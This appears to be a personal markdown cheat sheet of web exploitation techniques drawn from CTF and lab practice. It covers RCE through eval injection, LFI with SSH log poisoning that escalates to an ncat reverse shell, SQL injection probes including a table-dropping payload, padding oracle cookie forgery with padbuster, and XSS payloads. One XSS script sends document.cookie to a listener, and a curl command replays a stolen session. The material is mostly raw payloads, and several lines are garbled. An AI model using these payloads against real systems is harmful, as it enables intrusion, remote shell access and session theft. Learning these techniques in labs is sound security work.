<!-- # exploiting_web_application -->
# Server side EXploitation
## 1. Remote code execution (RCE)
  * Example of Code Evaluation Exploitation
  You want to have dynamically generated variable names for every user and store its registration date. This is how it could be done in PHP:
  
          eval("\$$user = '$regdate');
    
  attacker
  
          x = 'y';phpinfo();//
          
 * Stored Remote Code Evaluation Explanation and Example
 An expected input could be like this:

             ?language=de
        
attacker
   
             de';phpinfo()//

### Testing blind RCE
 #### 1. use tcpdump to capture ICMP requests
 
        tcpdump -i eth0 icmp
      Example output
      
              16:17:46.354621 IP 10.79.97.62 > 216.58.200.14: ICMP echo request, id 33817, seq 1707, length 64
              16:17:46.399959 IP 216.58.200.14 > 10.79.97.62: ICMP echo reply, id 33817, seq 1707, length 64
  * With the following command, we can filter ICMP echo-reply, 
        
        tcpdump -i eth0 "icmp[0] == 0"  
  * To filter ICMP echo-requests, we can use this tcpdump command.

        tcpdump -i eth0 "icmp[0] == 8"
#### 2. Run python server and capture hit request
   then 
   
         wget http://atckerip:python2:serverport/file_in_attacker machine
 ### Pregmatch bypass
     
    <?php

      if ( isset($_GET['sauce']) ){
          highlight_file(__FILE__);
      }

      if ( !isset($_COOKIE['sessionHash']) )
      {

          echo "Something Wrong, try again.";
          header("Location: ../index.php");

      }

      else if ( $_COOKIE['sessionHash'] == hash("sha256", "guest") )
      {
          die("You Need to be admin to use this page.");
      }

      else if ( $_COOKIE['sessionHash'] == hash("sha256", "admin") )
      {

          if ( !isset($_GET["name"]) ) { die("Missing Parameters (name) !!"); } 
          $name = preg_replace('/\$|\(|\)|ls|cat|more|head|tail|pwd|ps|la|;|&|find/i', '', $_GET['name'] );

          system("echo \"Welcome $name\";");
          header("X-Leak: ?sauce");

      }
      else
          die('Something Wrong, try again.');
      Welcome admin
   
  Then in robots.txt
  Allow /etc/flag
  
  bypass  in url... It reads every thing that starts with fl in the direcory
     
        `nl /etc/fl*`
## 2. LOcal File Inclusion vulnerability (LFI)
  * A Local File Inclusion attack is used to trick the application into exposing or running files on the server.
      
      Example vulnerable code 
        
          $file = $_GET['FILE'];
          if(isset(''file))
          {
             include("$file");
          }
      Exploits
      
        ?file=/etc/passwd
        ?file=/var/log/auth.log
         
       ssh log poisoning .. Since the auth.log
 is public acccessibke then through lfi the  we can inject malicious log in it.. Via ssh
 
              ssh '<?php system($_GET['c']); ?>'@192.168.1.31
   RCE in LFI ==> after poisoning
   
          ?file=/var/log/auth.log&c=ls -la
          ?file=/var/log/auth.log&c=ncat -e /bin/bash 192.168.1.2 1234
  ## 3. SQL Injection
    
   Testing
      
       ' or 1=1;--
       " or 1=1;--
       ' or 1=1; drop table notes; —
       'John' or 'x'='x' AND Password = 'Smith’ or ‘x’=’x’;
       
  For Example, if you get an error message like ‘Internal Server Error‘ as a search result, then we can be sure that this attack is possible in that part of the system.

     Other results that may notify a possible attack include:
     Blank page loaded.
     No error or success messages – functionality and page do not react to the input.
     Success message for malicious code
  
  Vulnerable Parts of this Attack
Before starting the testing process, every sincere tester should more or less know which parts would be most vulnerable to this attack.

It is also a good practice to plan which field of the system is to be tested exactly and in what order. In my testing career, I have learned that it is not a good idea to test fields against SQL attacks randomly as some fields can be missed.

As this attack is being performed in the database, all data entry system parts, input fields, and website links are vulnerable.

Vulnerable parts include:

     Login fields
     Search fields
     Comment fields
     Any other data entry and saving fields
     Website links
It is important to note that while testing against this attack, it is not enough to check only one or a few fields. It is quite common, that one field may be protected against SQL Injection, but then another does not. Therefore it is important not to forget to test all the website’s field
 ## 4. OS Command Injection
 
  Executing os specific commands
   * In url
      /index.php?arg=1; phpinfo()
 ## 5. Padding oracle Attack
          
   Detecting.
   
   -When a user autologin after account creation
   
   -When the same value of cookie occurs all time the user log in again (It should be different if secure  
     
   Attack
   
   * Using padbuster. Decrypt the given cookie after you create account
       
            padbuster  http://overflow.htb/home/index.php  WZ289JlHbbUU9GGQ%2F7x%2Fyj9i6pi052tC 8 --cookie "auth=WZ289JlHbbUU9GGQ%2F7x%2Fyj9i6pi052tC" 
            
   output

            Block 1 Results:
            [+] Cipher Text (HEX): 14f46190ffbc7fca
            [+] Intermediate Bytes (HEX): 2ceed986a43708c1
            [+] Plain Text: user=pet
   Then create new admin user cookie
    
         padbuster  http://overflow.htb/home/index.php  WZ289JlHbbUU9GGQ%2F7x%2Fyj9i6pi052tC 8 --cookie "auth=WZ289JlHbbUU9GGQ%2F7x%2Fyj9i6pi052tC" -plaintext 'user=admin'
 
 reference
     * https://forum.hackthebox.com/t/lazy-mini-writeup-ways-to-login/88
  ==================================================== <br>

# Client side Exploitation
  ==================================================== <br>

## Cross site scripting (XSS)
## XSS(Reflected)
### Basic XSS
  * Testing.  
      check if html tags are processed --> if <b> tags will be removed then your good to go next step
 
    Eg.
    
           <b> testing</b>
 
exploit
 
              <script>alert('Hello XSS')</script>
    
  * redirecting 
           
          <script>document.location = "http://google.com"</script>
    
  * Iframe injection (load arbitrary code in the browser)
  
         <iframe src="http://uwo.ca"></iframe>
 ### More Complex XSS
 * changing elements in the DOM --> It will change the 17th tag to point to evilsite.com
  
           <script>
           window.onload = function() {
             s=document.getElementsByTagName("a")[17];
             s.href="http://evilsite.com";
             s.text="http://evilsite.com";s.style.color="red";
              }
           </script>
    
   * url encoded aove script  
   
                %3C%73%63%72%69%70%74%3E%77%69%6E%64%6F%77%2E%6F%6E%6C%6F%61%64=%66%75%6E%63%74%69%6F%6E%28%29%7B%73=%64%6F%63%75%6D%65%6E%74%2E%67%65%74%45%6C%65%6D%65%6E%74%73%4  2%79%54%61%67%4E%61%6D%65%28%22%61%22%29%5B%31%37%5D%3B%73%2E%68%72%65%66=%22%68%74%74%70%3A%2F%2F%65%76%69%6C%73%69%74%65%2E%63%6F%6D%22%3B%73%2E%74%65%78%74=%22%68%74%74%70%3A%2F%2F%65%76%69%6C%73%69%74%65%2E%63%6F%6D%22%3B%73%2E%73%74%79%6C%65%2E%63%6F%6C%6F%72=%22%72%65%64%22%3B%7D%3C%2F%73%63%72%69%70%74%3E

### Stealing a cookie

       <script>new Image ().src="http://localhost:1234/"+document.cookie;</script>
   or
       
       <IMG src=1 onerror=alert(document.cookie)>
    
  * netcat listerner
       
        netcat -lvp 1234
  * using the stolen cookie to impesonate user ---> in DVWA changing the password of user

        curl --cookie "/security=low;%20PHPSESSID=kavqn49seghn91lcbs6j411v75" --location "localhost/dvwa/vulnerabilities/csrf/?password_new=chicken&password_conf=chicken&Change=Change#" | grep "Password"
 
## XSS(Stored)
*  website allows users to submit comments on blog posts, which are displayed to other users. It executes when user visits that site
   
     
          <script>alert(document.cookie)</script>
          <IMG src=1 onerror=alert(document.cookie)>
          <scr<script>ipt>alert(document.cookie)</script>
        
 ## XSS from HACKERONE
   * Stored email contact like below in general account settings 
     It is stored xss
     
          `luc1d"><img/src="x"onerror=alert(document.domain)>@wearehackerone.com`
      
        or
          
            `jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt    /--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e`
   
     
 #### mitigation
        
        
                      <?php 
                     $name = $_GET['name']; 
                     if (strpos($name, 'script') !== false) 
                     { http_response_code(403); die('Forbidden'); } 
                     ?>  
        
          
        
#### Effects of XSS
   * Stealing a cookie who will trigger XSS
   * redirecting to malicios pages
   * making request on behalf of the user who triggered the xss
   * DOM based attacks. Example changing the link/adding.. pointing to malicious.com
 
